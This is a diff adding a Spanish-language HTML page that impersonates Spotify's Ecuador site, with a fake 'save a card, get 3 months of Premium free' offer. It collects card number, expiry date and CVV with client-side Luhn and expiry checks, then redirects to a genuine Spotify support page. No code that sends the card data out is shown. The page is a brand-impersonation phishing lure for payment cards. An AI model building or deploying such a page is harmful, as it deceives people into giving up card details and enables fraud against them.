@@ -1,0 +1,755 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spotify Premium</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Montserrat', 'Proxima Nova', 'Gotham', Arial, sans-serif;
+            background-color: #121212;
+            color: white;
+            min-height: 100vh;
+        }
+        
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            background-color: #000;
+        }
+        
+        .logo img {
+            height: 25px;
+        }
+        
+        .nav-right {
+            display: flex;
+            align-items: center;
+        }
+        
+        .nav-right a {
+            color: white;
+            text-decoration: none;
+            margin-left: 20px;
+            font-size: 14px;
+        }
+        
+        .user-profile {
+            display: flex;
+            align-items: center;
+            margin-left: 20px;
+        }
+        
+        .user-avatar {
+            width: 30px;
+            height: 30px;
+            background-color: #333;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .main-content {
+            padding: 40px 40px 80px;
+            max-width: 1140px;
+            margin: 0 auto;
+            background-color: #121212;
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            font-weight: 700;
+            line-height: 1.2;
+            margin-bottom: 16px;
+            letter-spacing: -0.02em;
+            color: #fff;
+        }
+        
+        .subtitle {
+            font-size: 1.125rem;
+            font-weight: 400;
+            color: #a7a7a7;
+            margin-bottom: 64px;
+            letter-spacing: -0.01em;
+        }
+        
+        .card-section {
+            margin-top: 40px;
+            max-width: 740px;
+        }
+        
+        .section-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 32px;
+            letter-spacing: -0.02em;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #fff;
+        }
+        
+        .lock-icon {
+            font-size: 12px;
+            margin-left: 5px;
+        }
+        
+        .form-group {
+            margin-bottom: 24px;
+        }
+        
+        .form-label {
+            font-size: 0.875rem;
+            font-weight: 600;
+            color: #fff;
+            margin-bottom: 8px;
+            display: block;
+            transition: all 0.3s ease;
+            opacity: 0.8;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 4px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            background-color: #181818;
+            color: #fff;
+            font-size: 1rem;
+            font-family: inherit;
+            box-sizing: border-box;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            backdrop-filter: blur(5px);
+        }
+        
+        .form-control:hover {
+            border-color: rgba(255, 255, 255, 0.3);
+            background-color: #202020;
+            transform: translateY(-1px);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+        }
+        
+        .form-control:focus {
+            outline: none;
+            border-color: #1DB954;
+            background-color: #242424;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(29, 185, 84, 0.15);
+        }
+        
+        .row {
+            display: flex;
+            gap: 16px;
+            transition: all 0.3s ease;
+        }
+        
+        .row:hover .form-control {
+            filter: brightness(0.95);
+        }
+        
+        .row:hover .form-control:hover {
+            filter: brightness(1);
+        }
+        
+        .col {
+            flex: 1;
+        }
+        
+        .info-icon {
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            border: 1px solid white;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            margin-left: 5px;
+        }
+        
+        .disclaimer {
+            font-size: 0.875rem;
+            line-height: 1.5;
+            color: #a7a7a7;
+            margin: 32px 0 48px;
+            max-width: 740px;
+        }
+        
+        .submit-btn {
+            background-color: #1DB954;
+            color: black;
+            border: none;
+            border-radius: 500px;
+            padding: 14px 32px;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            letter-spacing: 0.02em;
+            min-width: 160px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+            text-decoration: none;
+        }
+        
+        .submit-btn:hover {
+            transform: scale(1.04);
+            background-color: #1ed760;
+        }
+        
+        footer {
+            background-color: #000;
+            padding: 50px 0 20px;
+            margin-top: 100px;
+        }
+        
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        
+        .footer-logo {
+            margin-right: 40px;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            width: 70%;
+        }
+        
+        .footer-column {
+            margin-right: 40px;
+            margin-bottom: 30px;
+        }
+        
+        .footer-column h4 {
+            color: #919496;
+            font-size: 12px;
+            text-transform: uppercase;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+        
+        .footer-column ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+        
+        .footer-column ul li {
+            margin-bottom: 15px;
+        }
+        
+        .footer-column ul li a {
+            color: white;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .footer-column ul li a:hover {
+            color: #1DB954;
+        }
+        
+        .social-links {
+            display: flex;
+            justify-content: flex-end;
+            margin-bottom: 30px;
+        }
+        
+        .social-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: #222;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-left: 15px;
+        }
+        
+        .bottom-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 30px;
+            padding: 0 20px;
+            max-width: 1200px;
+            margin: 30px auto 0;
+        }
+        
+        .country {
+            color: #919496;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .legal-links {
+            display: flex;
+            flex-wrap: wrap;
+        }
+        
+        .legal-links a {
+            color: #919496;
+            font-size: 12px;
+            margin-right: 20px;
+            text-decoration: none;
+        }
+        
+        .activate-windows {
+            position: fixed;
+            bottom: 0;
+            right: 0;
+            background-color: rgba(0,0,0,0.7);
+            padding: 5px 10px;
+            color: #ccc;
+            font-size: 12px;
+        }
+        
+        .input-icon {
+            position: relative;
+            overflow: hidden;
+        }
+
+        .input-icon svg {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 20px;
+            height: 20px;
+            fill: #a7a7a7;
+            transition: all 0.3s ease;
+        }
+
+        .input-icon input:focus + svg {
+            fill: #1DB954;
+            transform: translateY(-50%) scale(1.1);
+        }
+
+        .form-group:focus-within .form-label {
+            color: #1DB954;
+            opacity: 1;
+            transform: translateY(-2px);
+        }
+
+        /* Animación al escribir */
+        .form-control:not(:placeholder-shown) {
+            border-color: rgba(255, 255, 255, 0.4);
+            background-color: #202020;
+        }
+
+        /* Efecto de brillo al focus */
+        .form-control:focus::after {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            border-radius: 6px;
+            background: linear-gradient(45deg, #1DB954, #1ed760);
+            opacity: 0.1;
+            z-index: -1;
+            animation: glow 1.5s ease-in-out infinite alternate;
+        }
+
+        @keyframes glow {
+            from {
+                opacity: 0.1;
+            }
+            to {
+                opacity: 0.2;
+            }
+        }
+
+        /* Animación para los iconos de tarjeta */
+        .input-icon svg {
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-50%) translateX(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(-50%) translateX(0);
+            }
+        }
+
+        /* Efecto de escritura para el placeholder */
+        .form-control::placeholder {
+            transition: all 0.3s ease;
+        }
+
+        .form-control:focus::placeholder {
+            opacity: 0.7;
+            transform: translateX(5px);
+        }
+
+        /* Animación para validación */
+        .form-control:valid:not(:placeholder-shown) {
+            border-color: #1DB954;
+        }
+
+        .form-control:invalid:not(:placeholder-shown) {
+            border-color: #ff4444;
+        }
+        
+        @media (max-width: 768px) {
+            .main-content {
+                padding: 24px 16px 40px;
+            }
+
+            h1 {
+                font-size: 2rem;
+                line-height: 1.3;
+            }
+
+            .subtitle {
+                font-size: 1rem;
+                margin-bottom: 40px;
+            }
+
+            .section-title {
+                font-size: 1.25rem;
+                margin-bottom: 24px;
+            }
+
+            .row {
+                flex-direction: column;
+                gap: 8px;
+            }
+
+            .form-control {
+                padding: 12px 16px;
+            }
+        }
+
+        form {
+            margin-bottom: 32px;
+        }
+    </style>
+</head>
+<body>
+    <header style="display: flex; align-items: center; justify-content: space-between; padding: 0 40px; background: #000; height: 56px;">
+        <div style="display: flex; align-items: center; gap: 10px;">
+            <a href="https://www.spotify.com/ec/" style="text-decoration: none;">
+                <img src="https://storage.googleapis.com/pr-newsroom-wp/1/2018/11/Spotify_Logo_CMYK_White.png" alt="Spotify Logo" style="height:32px;">
+            </a>
+        </div>
+        <nav style="display: flex; align-items: center; gap: 32px;">
+            <a href="https://www.spotify.com/ec/premium/" style="color: #fff; text-decoration: none; font-weight: 500; transition: color 0.3s ease;">Premium</a>
+            <a href="https://support.spotify.com/ec/" style="color: #fff; text-decoration: none; font-weight: 500; transition: color 0.3s ease;">Ayuda</a>
+            <a href="https://www.spotify.com/ec/download/" style="color: #fff; text-decoration: none; font-weight: 500; transition: color 0.3s ease;">Descargar</a>
+        </nav>
+        <div style="display: flex; align-items: center; gap: 16px; border-left: 1px solid #222; padding-left: 32px;">
+            <a href="https://www.spotify.com/ec/account/overview/" style="text-decoration: none; display: flex; align-items: center; gap: 8px;">
+                <div style="width: 32px; height: 32px; border-radius: 50%; border: 1px solid #fff; display: flex; align-items: center; justify-content: center;">
+                    <svg wLidth="20" height="20" fill="white" viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M12 14c-4.418 0-8 1.79-8 4v2h16v-2c0-2.21-3.582-4-8-4z"/></svg>
+                </div>
+                <span style="color: #fff; font-size: 1rem;">Perfil ▼</span>
+            </a>
+        </div>
+    </header>
+
+    <div class="main-content">
+        <h1 style="font-family: 'Montserrat', 'Proxima Nova', 'Gotham', Arial, sans-serif; font-size: 2.5rem; font-weight: 900; line-height: 1.1; margin-bottom: 10px;">Guarda una tarjeta y recibe<br>3 meses Premium GRATIS</h1>
+        <div class="subtitle" style="font-family: 'Montserrat', 'Proxima Nova', 'Gotham', Arial, sans-serif; font-size: 1.15rem; font-weight: 400; color: #fff; margin-bottom: 24px;">Guarda una tarjeta como medio de pago y recibe 3 meses de premium gratis. Oferta válida hasta el 25 de mayo - 2025</div>
+
+        <div class="card-section">
+            <div class="section-title" style="font-family: 'Montserrat', 'Proxima Nova', 'Gotham', Arial, sans-serif; font-size: 2rem; font-weight: 900; color: #fff; margin-bottom: 18px; line-height: 1.1;">Tarjeta de crédito o débito</div>
+
+            <div class="form-group input-icon">
+                <label class="form-label">Número de tarjeta</label>
+                <svg viewBox="0 0 24 24"><rect x="2" y="6" width="20" height="12" rx="2"/><rect x="4" y="10" width="16" height="2" rx="1"/><rect x="4" y="14" width="6" height="2" rx="1"/></svg>
+                <input type="text" class="form-control" placeholder="0000 0000 0000 0000" oninput="formatCardNumber(this)" maxlength="19">
+            </div>
+
+            <div class="row">
+                <div class="col">
+                    <div class="form-group">
+                        <label class="form-label">Fecha de vencimiento</label>
+                        <input type="text" class="form-control" placeholder="MM/AA" oninput="formatExpiryDate(this)" maxlength="5">
+                    </div>
+                </div>
+                <div class="col">
+                    <div class="form-group input-icon">
+                        <label class="form-label">Código de seguridad</label>
+                        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><rect x="9" y="8" width="6" height="8" rx="1"/></svg>
+                        <input type="text" class="form-control" placeholder="123" oninput="formatCVV(this)" maxlength="4">
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="disclaimer">
+            Das tu consentimiento para obtener acceso a tu suscripción de Spotify inmediatamente y a que, si no cancelas antes de que termine el período de prueba el 5 de junio de 2025, se te cobre la tarifa de suscripción de forma automática todos los meses hasta que canceles. Si la cancelas durante el período de prueba, perderás el acceso a las ventajas de Premium inmediatamente.
+        </div>
+
+        <form id="cardForm" onsubmit="submitForm(event)">
+            <button type="submit" class="submit-btn">Guardar</button>
+        </form>
+
+        <script>
+            function formatCardNumber(input) {
+                let value = input.value.replace(/\D/g, '');
+                let formattedValue = '';
+                for (let i = 0; i < value.length; i++) {
+                    if (i > 0 && i % 4 === 0) {
+                        formattedValue += ' ';
+                    }
+                    formattedValue += value[i];
+                }
+                input.value = formattedValue;
+                validateCardNumber(input);
+            }
+
+            function validateCardNumber(input) {
+                const cardNumber = input.value.replace(/\s/g, '');
+                const cardType = getCardType(cardNumber);
+                
+                // Validar longitud según tipo de tarjeta
+                const validLengths = {
+                    'amex': 15,
+                    'visa': 16,
+                    'mastercard': 16,
+                    'discover': 16
+                };
+
+                if (cardType && cardNumber.length === validLengths[cardType]) {
+                    if (luhnCheck(cardNumber)) {
+                        input.style.borderColor = '#1DB954';
+                    } else {
+                        input.style.borderColor = '#ff4444';
+                    }
+                } else {
+                    input.style.borderColor = '#ff4444';
+                }
+            }
+
+            function luhnCheck(val) {
+                let sum = 0;
+                let isEven = false;
+                
+                for (let i = val.length - 1; i >= 0; i--) {
+                    let digit = parseInt(val.charAt(i));
+                    
+                    if (isEven) {
+                        digit *= 2;
+                        if (digit > 9) {
+                            digit -= 9;
+                        }
+                    }
+                    
+                    sum += digit;
+                    isEven = !isEven;
+                }
+                
+                return (sum % 10) === 0;
+            }
+
+            function getCardType(cardNumber) {
+                if (/^3[47]/.test(cardNumber)) return 'amex';
+                if (/^4/.test(cardNumber)) return 'visa';
+                if (/^5[1-5]/.test(cardNumber)) return 'mastercard';
+                if (/^6(?:011|5)/.test(cardNumber)) return 'discover';
+                return null;
+            }
+
+            function formatExpiryDate(input) {
+                let value = input.value.replace(/\D/g, '');
+                if (value.length >= 2) {
+                    value = value.slice(0, 2) + '/' + value.slice(2, 4);
+                }
+                input.value = value;
+                validateExpiryDate(input);
+            }
+
+            function validateExpiryDate(input) {
+                const [month, year] = input.value.split('/');
+                const currentDate = new Date();
+                const currentYear = currentDate.getFullYear() % 100;
+                const currentMonth = currentDate.getMonth() + 1;
+
+                if (month && year) {
+                    const expMonth = parseInt(month);
+                    const expYear = parseInt(year);
+
+                    if (expMonth > 12 || expMonth < 1) {
+                        input.style.borderColor = '#ff4444';
+                        return;
+                    }
+
+                    if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
+                        input.style.borderColor = '#ff4444';
+                    } else {
+                        input.style.borderColor = '#1DB954';
+                    }
+                }
+            }
+
+            function formatCVV(input) {
+                const cardNumber = document.querySelector('input[placeholder="0000 0000 0000 0000"]').value;
+                const cardType = getCardType(cardNumber.replace(/\s/g, ''));
+                const maxLength = cardType === 'amex' ? 4 : 3;
+                
+                let value = input.value.replace(/\D/g, '');
+                if (value.length > maxLength) {
+                    value = value.slice(0, maxLength);
+                }
+                input.value = value;
+                validateCVV(input);
+            }
+
+            function validateCVV(input) {
+                const cardNumber = document.querySelector('input[placeholder="0000 0000 0000 0000"]').value;
+                const cardType = getCardType(cardNumber.replace(/\s/g, ''));
+                const maxLength = cardType === 'amex' ? 4 : 3;
+                
+                if (input.value.length === maxLength) {
+                    input.style.borderColor = '#1DB954';
+                } else {
+                    input.style.borderColor = '#ff4444';
+                }
+            }
+
+            function submitForm(event) {
+                event.preventDefault();
+                const cardNumber = document.querySelector('input[placeholder="0000 0000 0000 0000"]').value;
+                const expiryDate = document.querySelector('input[placeholder="MM/AA"]').value;
+                const cvv = document.querySelector('input[placeholder="123"]').value;
+
+                if (!luhnCheck(cardNumber.replace(/\s/g, ''))) {
+                    alert('Número de tarjeta inválido');
+                    return;
+                }
+
+                const [month, year] = expiryDate.split('/');
+                const currentDate = new Date();
+                const currentYear = currentDate.getFullYear() % 100;
+                const currentMonth = currentDate.getMonth() + 1;
+
+                if (parseInt(month) > 12 || parseInt(month) < 1 || 
+                    parseInt(year) < currentYear || 
+                    (parseInt(year) === currentYear && parseInt(month) < currentMonth)) {
+                    alert('Fecha de vencimiento inválida');
+                    return;
+                }
+
+                window.location.href = 'https://support.spotify.com/us/article/payment-methods/';
+            }
+        </script>
+    </div>
+
+    <footer>
+        <div class="footer-content" style="flex-direction:column;align-items:center;gap:32px;">
+            <div class="footer-logo" style="display:flex;align-items:center;justify-content:center;gap:12px;">
+                <a href="https://www.spotify.com/ec/" style="text-decoration: none;">
+                    <img src="https://storage.googleapis.com/pr-newsroom-wp/1/2018/11/Spotify_Logo_CMYK_White.png" alt="Spotify Logo" style="height:48px;">
+                </a>
+            </div>
+            
+            <div class="footer-links">
+                <div class="footer-column">
+                    <h4>COMPAÑÍA</h4>
+                    <ul>
+                        <li><a href="https://www.spotify.com/ec/about-us/">Acerca de</a></li>
+                        <li><a href="https://www.spotifyjobs.com/">Empleo</a></li>
+                        <li><a href="https://newsroom.spotify.com/">For the Record</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-column">
+                    <h4>COMUNIDADES</h4>
+                    <ul>
+                        <li><a href="https://artists.spotify.com/">Servicios para artistas</a></li>
+                        <li><a href="https://developer.spotify.com/">Desarrolladores</a></li>
+                        <li><a href="https://ads.spotify.com/">Publicidad</a></li>
+                        <li><a href="https://investors.spotify.com/">Inversionistas</a></li>
+                        <li><a href="https://spotifyforvendors.com/">Proveedores</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-column">
+                    <h4>ENLACES ÚTILES</h4>
+                    <ul>
+                        <li><a href="https://support.spotify.com/ec/">Ayuda</a></li>
+                        <li><a href="https://open.spotify.com/">Reproductor web</a></li>
+                        <li><a href="https://www.spotify.com/ec/download/">App móvil gratis</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-column">
+                    <h4>PLANES DE SPOTIFY</h4>
+                    <ul>
+                        <li><a href="https://www.spotify.com/ec/premium/">Premium</a></li>
+                        <li><a href="https://www.spotify.com/ec/premium/#plans">Individual</a></li>
+                        <li><a href="https://www.spotify.com/ec/duo/">Premium Duo</a></li>
+                        <li><a href="https://www.spotify.com/ec/family/">Premium Familiar</a></li>
+                        <li><a href="https://www.spotify.com/ec/student/">Premium para Estudiantes</a></li>
+                        <li><a href="https://www.spotify.com/ec/free/">Versión gratuita</a></li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="social-links">
+                <a href="https://instagram.com/spotify" class="social-icon" target="_blank" rel="noopener">
+                    <svg viewBox="0 0 24 24" width="24" height="24" fill="white">
+                        <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
+                    </svg>
+                </a>
+                <a href="https://twitter.com/spotify" class="social-icon" target="_blank" rel="noopener">
+                    <svg viewBox="0 0 24 24" width="24" height="24" fill="white">
+                        <path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"/>
+                    </svg>
+                </a>
+                <a href="https://facebook.com/spotify" class="social-icon" target="_blank" rel="noopener">
+                    <svg viewBox="0 0 24 24" width="24" height="24" fill="white">
+                        <path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"/>
+                    </svg>
+                </a>
+            </div>
+        </div>
+        
+        <div class="bottom-footer">
+            <div class="country">
+                <span style="display: flex; align-items: center; gap: 8px;">
+                    <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="6" cy="6" r="6" fill="#1DB954"/>
+                    </svg>
+                    Ecuador
+                </span>
+            </div>
+            
+            <div class="legal-links">
+                <a href="https://www.spotify.com/ec/legal/">Legal</a>
+                <a href="https://www.spotify.com/ec/privacy/">Seguridad y Centro de Privacidad</a>
+                <a href="https://www.spotify.com/ec/legal/privacy-policy/">Política de Privacidad</a>
+                <a href="https://www.spotify.com/ec/legal/cookies-policy/">Cookies</a>
+                <a href="https://www.spotify.com/ec/legal/privacy-policy/#s3">Sobre los anuncios</a>
+            </div>
+        </div>
+    </footer>
+    
+    <div class="activate-windows">
+        Activate Windows<br>
+        Go to Settings to activate Windows
+    </div>
+</body>
+</html>
